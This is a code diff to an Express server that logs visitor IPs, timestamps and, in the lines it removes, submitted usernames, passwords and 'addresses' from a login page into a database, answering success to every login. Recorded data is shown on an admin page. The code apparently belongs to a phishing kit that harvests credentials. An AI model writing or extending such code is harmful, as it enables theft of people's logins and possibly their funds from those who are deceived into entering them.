@@ -19,8 +19,7 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     address TEXT,
     ip TEXT,
     timestamp TEXT
-)`).then(() => console.log("✅ Supabase Connected"))
-   .catch(err => console.error("Table Error:", err.message));
+)`);
 
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
@@ -28,27 +27,15 @@ function saveRecord(type, username = null, password = null, address = null, ip =
         "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
         [type, username, password, address, ip, timestamp]
     );
+    console.log(`📍 SAVED: ${type} | IP: ${ip}`);
 }
 
-// Record Page Visit Immediately
+// MAIN ROUTE - This must work
 app.get('/', (req, res) => {
     const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
     saveRecord('Page Visit', null, null, null, ip);
-    console.log(`📍 Page Visit Recorded | IP: ${ip}`);
+    console.log("✅ Someone opened the main link!");
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-app.get('/login.html', (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
-    saveRecord('Page Visit', null, null, null, ip);
-    res.sendFile(path.join(__dirname, 'public', 'login.html'));
-});
-
-app.post('/api/login', (req, res) => {
-    const { username, password, address } = req.body;
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
-    saveRecord('Login Attempt', username, password, address, ip);
-    res.json({ success: true });
 });
 
 app.get('/api/records', async (req, res) => {
@@ -60,12 +47,7 @@ app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
-app.post('/api/clear', async (req, res) => {
-    await pool.query("DELETE FROM records");
-    res.json({ message: 'Cleared' });
-});
-
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`🚀 Server running on Vercel`);
 });
